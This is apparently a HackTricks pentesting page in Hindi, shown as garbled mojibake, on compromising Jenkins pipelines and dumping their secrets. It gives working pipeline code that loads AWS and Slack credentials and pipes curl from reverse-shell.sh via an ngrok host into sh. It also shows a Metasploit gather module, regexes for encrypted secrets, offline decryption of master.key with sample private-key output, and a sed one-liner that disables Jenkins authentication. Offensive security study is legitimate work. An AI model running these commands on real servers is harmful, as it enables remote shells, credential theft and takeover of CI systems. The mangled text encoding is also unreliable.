рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХреБрдЫ рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ** (рдордВрдЪ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ)ред

рдХрд╕реНрдЯрдо рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЖрдо рдЯреНрд░рд┐рдЧрд░реНрд╕ рд╣реИрдВ:

* рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ) рдХреЗ рд▓рд┐рдП **рдкреБрд▓ рдЕрдиреБрд░реЛрдз**
* рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ) рдкрд░ **рдкреБрд╢**
* рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЛ **рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ** рдФрд░ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрдм рддрдХ рдпрд╣ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рди рд╣реЛ рдЬрд╛рдП

{% hint style="info" %}
рдпрджрд┐ рдЖрдк рдПрдХ **рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдЙрдореНрдореАрдж рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдк **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдВрдЧрдарди** рдХреА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреА рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ **PR рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЯреНрд░рд┐рдЧрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди рдпрджрд┐ рдпрд╣ **рдЦрд░рд╛рдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдкрд╛рдЗрдкрд▓рд╛рдЗрди RCE

рдкрд┐рдЫрд▓реЗ RCE рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдкрд╣рд▓реЗ рд╣реА рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ [**рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](./#rce-creating-modifying-pipeline)ред

### Env рдЪрд░ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛

рд╕рдВрдкреВрд░реНрдг рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ рд▓рд┐рдП рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда env рдЪрд░** рдШреЛрд╖рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЗрди env рдЪрд░реЛрдВ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**, рд▓реЗрдХрд┐рди рд╣рдорд▓рд╛рд╡рд░ рд╣рдореЗрд╢рд╛ **рд╕рднреА рдкрд╛рдЗрдкрд▓рд╛рдЗрди** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди/Jenkinsfiles рдХреА **рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдбрдВрдк рдХрд░рдирд╛

Jenkins рджреНрд╡рд╛рд░рд╛ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдХреИрд╕реЗ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдкреНрд░рдорд╛рдг-рдкрддреНрд░ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕реНрдХреЛрдк рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** (`/credentials/`) рдпрд╛ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП** (`/job/<project-name>/configure`). рдЗрд╕рд▓рд┐рдП, рдЙрди рд╕рднреА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХрдо рд╕реЗ рдХрдо рдЙрди рд╕рднреА рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ **рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** рдЬрд┐рдирдореЗрдВ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдХрд╕реНрдЯрдо/рд╡рд┐рд╖рд╛рдХреНрдд рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдПрдХ рдФрд░ рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ **env рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЖрдкрдХреЛ **рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдирд╛рдо рдФрд░ рдкреНрд░рдХрд╛рд░ рдЬрд╛рдирдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк **`usernamePassword`** **рд╕реАрдХреНрд░реЗрдЯ** рдХреЛ рдПрдХ **`string`** **рд╕реАрдХреНрд░реЗрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ **рд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ **рдПрд░рд░** рдорд┐рд▓реЗрдЧрд╛:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЧреБрдкреНрдд рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
рдЗрд╕ рдкреГрд╖реНрда рдХреЗ рдЕрдВрдд рдореЗрдВ рдЖрдк **рд╕рднреА рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**рд╕рднреА рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░рд┐рдпреЛрдВ рдХреЛ рдПрдХ рд╕рд╛рде рдбрдВрдк рдХрд░рдиреЗ** рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ **Jenkins** рдорд╢реАрди рдХреЛ **рд╕рдордЭреМрддрд╛ рдХрд░рдХреЗ** рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **built-in node** рдореЗрдВ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЪрд▓рд╛рдХрд░) рдФрд░ рдлрд┐рд░ **рдорд╛рд╕реНрдЯрд░ рдХреАрдЬ** рдФрд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░рд┐рдпреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдХреЗ** рдФрд░ рдЙрдиреНрд╣реЗрдВ рдСрдлрд▓рд╛рдЗрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ред\
рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░реЗрдВ рдЗрд╕рдХреА рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [Nodes & Agents рдЕрдиреБрднрд╛рдЧ](./#nodes-and-agents) рдФрд░ [Post Exploitation рдЕрдиреБрднрд╛рдЧ](./#post-exploitation) рдореЗрдВ рдорд┐рд▓реЗрдЧреАред
{% endhint %}

### рдЯреНрд░рд┐рдЧрд░реНрд╕

[рдбреЙрдХреНрд╕ рд╕реЗ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): `triggers` рдирд┐рд░реНрджреЗрд╢ рдЙрди **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рддрд░реАрдХреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдирд╕реЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдкреБрдирдГ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред GitHub рдпрд╛ BitBucket рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХреЗ рд▓рд┐рдП, `triggers` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗрдмрд╣реБрдХ-рдЖрдзрд╛рд░рд┐рдд рдПрдХреАрдХрд░рдг рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдЯреНрд░рд┐рдЧрд░реНрд╕ `cron`, `pollSCM` рдФрд░ `upstream` рд╣реИрдВред

Cron рдЙрджрд╛рд╣рд░рдг:
```bash
triggers { cron('H */4 * * 1-5') }
```
**рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рджреЗрдЦреЗрдВ**ред

### рдиреЛрдбреНрд╕ рдФрд░ рдПрдЬреЗрдВрдЯреНрд╕

рдПрдХ **Jenkins рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдореЗрдВ **рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╡рд┐рднрд┐рдиреНрди рдПрдЬреЗрдВрдЯреНрд╕** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХрд╛ рдорддрд▓рдм рд╣реИ **рд╡рд┐рднрд┐рдиреНрди рд╕рдВрднрд╛рд╡рд┐рдд рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ **рд╡рд┐рднрд┐рдиреНрди рдиреЗрдЯрд╡рд░реНрдХ рдкрд╣реБрдВрдЪ** рдЬрд┐рд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдХреЛ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдЖрдк `/computer/` рдореЗрдВ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдиреЛрдбреНрд╕** рдХреЛ рдЧрд┐рди рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдкрдХреЛ рдЖрдорддреМрд░ рдкрд░ \*\*`Built-In Node` \*\* (рдЬреЛ Jenkins рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ) рдФрд░ рд╕рдВрднрд╡рддрдГ рдФрд░ рднреА рдорд┐рд▓реЗрдВрдЧреЗ:

![](<../../.gitbook/assets/image (25).png>)

**Built-In node рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ Jenkins рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред

рдпрд╣ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдЖрдк **built-in Jenkins node** рдореЗрдВ **pipeline** рдХреЛ **рдЪрд▓рд╛рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЖрдк рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ рдЕрдВрджрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
pipeline {
agent {label 'built-in'}
```
### рдкреВрд░реНрдг рдЙрджрд╛рд╣рд░рдг

рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдЬреЗрдВрдЯ рдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди, рдХреНрд░реЙрди рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдФрд░ рд╕реНрдЯреЗрдЬ env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рд╕рд╛рде, рдПрдХ рд╕реНрдЯреЗрдк рдореЗрдВ 2 рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рд▓реЛрдб рдХрд░рдирд╛ рдФрд░ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬрдирд╛:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

рдЖрдк `/credentials/` рдкрд░ рдЬрд╛рдХрд░ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╢рд░реНрддреЗ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ `credentials.xml` рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рджрд┐рдЦрд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди **build configuration files** рдореЗрдВ рднреА **рдЕрдзрд┐рдХ credentials** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рд╡рд╣рд╛рдВ рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **credentials (secrets) рдХреЗ рдирд╛рдо** рдФрд░ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рдЕрдиреНрдп credentials** рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Groovy рд╕реЗ

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### рдбрд┐рд╕реНрдХ рд╕реЗ

Jenkins secrets рдХреЛ **decrypt рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╛рдЗрд▓реЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ:

* secrets/master.key
* secrets/hudson.util.Secret

рдРрд╕реЗ **secrets рдЖрдорддреМрд░ рдкрд░ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рдПрдХ regex рд╣реИ:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### рдЬреЗрдирдХрд┐рдВрд╕ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдСрдлрд▓рд╛рдЗрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╛рд╕рд╡рд░реНрдбреНрд╕ рдбрдВрдк рдХрд░ рд▓рд┐рдП рд╣реИрдВ**, рддреЛ [**рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрди рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ**ред
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy рд╕реЗ Jenkins рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### рдирдпрд╛ рдПрдбрдорд┐рди рдпреВрдЬрд░ рдмрдирд╛рдПрдВ

1. Jenkins рдХреА config.xml рдлрд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ `/var/lib/jenkins/config.xml` рдпрд╛ `C:\Program Files (x86)\Jenkis\` рдореЗрдВред
2. рд╢рдмреНрдж `<useSecurity>true</useSecurity>` рдХреЛ рдЦреЛрдЬреЗрдВ рдФрд░ рд╢рдмреНрдж **`true`** рдХреЛ **`false`** рдореЗрдВ рдмрджрд▓реЗрдВред
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** рд╕рд░реНрд╡рд░ рдХреЛ **рд░реАрд╕реНрдЯрд╛рд░реНрдЯ** рдХрд░реЗрдВ: `service jenkins restart`
4. рдЕрдм рдлрд┐рд░ рд╕реЗ Jenkins рдкреЛрд░реНрдЯрд▓ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЗрд╕ рдмрд╛рд░ **Jenkins рдХреЛрдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд╣реАрдВ рдорд╛рдВрдЧреЗрдЧрд╛**ред рдЖрдк "**Manage Jenkins**" рдкрд░ рдЬрд╛рдХрд░ **рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рдлрд┐рд░ рд╕реЗ рд╕реЗрдЯ** рдХрд░реЗрдВред
5. `<useSecurity>true</useSecurity>` рдореЗрдВ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдмрджрд▓рдХрд░ **рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдХреЛ рдлрд┐рд░ рд╕реЗ рдЗрдиреЗрдмрд▓** рдХрд░реЗрдВ рдФрд░ **Jenkins рдХреЛ рдлрд┐рд░ рд╕реЗ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ** рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
